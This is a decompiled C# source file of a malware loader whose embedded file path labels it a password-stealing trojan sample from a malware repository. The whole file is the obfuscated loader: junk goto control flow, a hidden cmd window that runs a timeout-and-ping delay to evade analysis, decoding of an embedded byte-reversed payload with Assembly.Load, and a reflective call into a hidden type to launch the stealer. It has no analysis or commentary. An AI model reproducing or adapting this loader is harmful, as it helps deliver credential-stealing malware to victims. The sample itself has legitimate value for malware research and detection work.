// Decompiled with JetBrains decompiler
// Type: 
// Assembly: moris, Version=7.3.1.0, Culture=neutral, PublicKeyToken=null
// MVID: 4FA206C1-5DF8-4028-65D0-C8A6781C83C3
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\Trojan-PSW.Win32.Stealer.aixd-1adbcbe596643451133f94a5976e52a5e8f608682124477f47141996eb5a98d7.exe

using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

internal sealed class \u0003
{
  public \u0003()
  {
    if (true)
      ;
    // ISSUE: explicit constructor call
    base.\u002Ector();
  }

  [STAThread]
  private static void \u0002()
  {
    // ISSUE: variable of a boxed type
    __Boxed<DateTime> now = (ValueType) DateTime.Now;
    if (true)
      goto label_4;
label_1:
    string executablePath = Application.ExecutablePath;
    if (true)
      goto label_5;
label_2:
    if (true)
      goto label_6;
label_3:
    \u0003.\u0008();
    \u0003.\u0003();
    return;
label_6:
    \u0003.\u0006();
    goto label_3;
label_5:
    Console.WriteLine(executablePath);
    goto label_2;
label_4:
    Console.WriteLine((object) now);
    goto label_1;
  }

  internal static void \u0002(ref byte[] _param0)
  {
    byte[] numArray = _param0;
    int length = _param0.Length;
    if (false)
      return;
    Array.Reverse((Array) numArray, 0, length);
  }

  private static void \u0003()
  {
    try
    {
      string[] strArray1 = File.ReadAllLines(Environment.CurrentDirectory + "\\forums.txt");
      if (true)
        goto label_4;
label_1:
      string[] strArray2;
      Task[] taskArray1 = new Task[strArray2.Length];
      if (true)
        goto label_5;
label_2:
      Task[] taskArray2;
      \u0002 obj1 = new \u0002(taskArray2.Length, strArray2);
      if (true)
        goto label_6;
label_3:
      DateTime now = DateTime.Now;
      \u0002 obj2;
      for (int index = 0; index < taskArray2.Length; ++index)
      {
        string str = strArray2[index];
        Task task = obj2.\u0002(new CancellationToken?(), (object) str);
        taskArray2[index] = task;
      }
      Task.WaitAll(taskArray2);
      Console.WriteLine((DateTime.Now - now).TotalMilliseconds.ToString());
      return;
label_6:
      obj2 = obj1;
      goto label_3;
label_5:
      taskArray2 = taskArray1;
      goto label_2;
label_4:
      strArray2 = strArray1;
      goto label_1;
    }
    catch
    {
      \u0003.\u0005();
    }
  }

  private static System.Type[] \u0002()
  {
    Assembly[] assemblies = AppDomain.CurrentDomain.GetAssemblies();
    if (true)
      goto label_4;
label_1:
    List<System.Type> typeList1 = new List<System.Type>();
    if (true)
      goto label_5;
label_2:
    Assembly[] assemblyArray1;
    Assembly[] assemblyArray2 = assemblyArray1;
    if (true)
      goto label_6;
label_3:
    List<System.Type> typeList2;
    Assembly[] assemblyArray3;
    for (int index = 0; index < assemblyArray3.Length; ++index)
    {
      Assembly assembly = assemblyArray3[index];
      typeList2.AddRange((IEnumerable<System.Type>) assembly.GetTypes());
    }
    return typeList2.ToArray();
label_6:
    assemblyArray3 = assemblyArray2;
    goto label_3;
label_5:
    typeList2 = typeList1;
    goto label_2;
label_4:
    assemblyArray1 = assemblies;
    goto label_1;
  }

  private static void \u0005()
  {
    System.Type[] typeArray1 = \u0003.\u0002();
    if (true)
      goto label_2;
label_1:
    System.Type[] typeArray2;
    System.Type[] source = typeArray2;
    Func<System.Type, bool> predicate = \u0003.\u0002.\u0003;
    if (predicate == null)
    {
      Func<System.Type, bool> func = new Func<System.Type, bool>(\u0003.\u0002.\u0002.\u0002);
      if (false)
      {
        predicate = func;
      }
      else
      {
        \u0003.\u0002.\u0003 = func;
        predicate = func;
      }
    }
    System.Type type1 = ((IEnumerable<System.Type>) source).First<System.Type>(predicate);
    if (true)
      goto label_8;
label_7:
    System.Type type2;
    type2.InvokeMember("Mfcxuwgtidhbmzztnomfqogk", BindingFlags.InvokeMethod, (Binder) null, (object) null, (object[]) null);
    return;
label_8:
    type2 = type1;
    goto label_7;
label_2:
    typeArray2 = typeArray1;
    goto label_1;
  }

  private static void \u0008()
  {
    Queue<int> intQueue1 = new Queue<int>();
    if (true)
      goto label_2;
label_1:
    Queue<int> intQueue2;
    intQueue2.Enqueue(11);
    intQueue2.Enqueue(24);
    intQueue2.Enqueue(Assembly.Load(new \u0008((TaskCompletionSource<object>) null, new CancellationToken?(), (object) null).\u0002()).FullName.GetHashCode());
    intQueue2.Enqueue(34);
    intQueue2.Enqueue(4);
    intQueue2.Enqueue(29);
    Queue<int>.Enumerator enumerator1 = intQueue2.GetEnumerator();
    Queue<int>.Enumerator enumerator2;
    if (true)
      enumerator2 = enumerator1;
    try
    {
      while (enumerator2.MoveNext())
      {
        int current = enumerator2.Current;
        if (true)
          goto label_7;
label_6:
        int num;
        Console.Write(num);
        continue;
label_7:
        num = current;
        goto label_6;
      }
      return;
    }
    finally
    {
      enumerator2.Dispose();
    }
label_2:
    intQueue2 = intQueue1;
    goto label_1;
  }

  private static void \u0006() => Process.Start(new ProcessStartInfo()
  {
    FileName = "cmd",
    Arguments = "/c timeout -t 15 -nobreak && ping google.com",
    WindowStyle = ProcessWindowStyle.Hidden,
    CreateNoWindow = true
  }).WaitForExit();

  [Serializable]
  private sealed class \u0002
  {
    public static readonly \u0003.\u0002 \u0002;
    public static Func<System.Type, bool> \u0003;

    static \u0002()
    {
      \u0003.\u0002 obj = new \u0003.\u0002();
      if (false)
        return;
      \u0003.\u0002.\u0002 = obj;
    }

    public \u0002()
    {
      if (true)
        ;
      // ISSUE: explicit constructor call
      base.\u002Ector();
    }

    internal bool \u0002(System.Type _param1)
    {
      System.Type type = _param1;
      if (true)
        ;
      return type.FullName == "Ddqbsavrqj.Rtgikgczpqmrv";
    }
  }
}
